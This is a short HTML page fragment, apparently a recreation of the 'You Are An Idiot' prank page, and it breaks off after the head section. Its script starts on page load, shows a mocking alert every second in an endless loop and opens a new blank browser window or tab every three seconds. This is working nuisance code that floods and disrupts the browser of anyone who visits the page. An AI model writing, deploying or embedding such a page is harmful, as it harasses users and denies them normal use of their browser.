<!DOCTYPE html>
<html lang="en">
<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You Are An Idiot</title>
    <script>
        function startChaos() {
            // Display alerts in a loop (using setTimeout to avoid complete freeze)
            (function showAlert() {
                alert("You Are An Idiot! 😀");
                setTimeout(showAlert, 1000);
            })();

            // Open new browser windows or tabs periodically
            setInterval(() => {
                window.open("", "_blank");
            }, 3000);
        }

        window.onload = startChaos;
    </script>
</head>
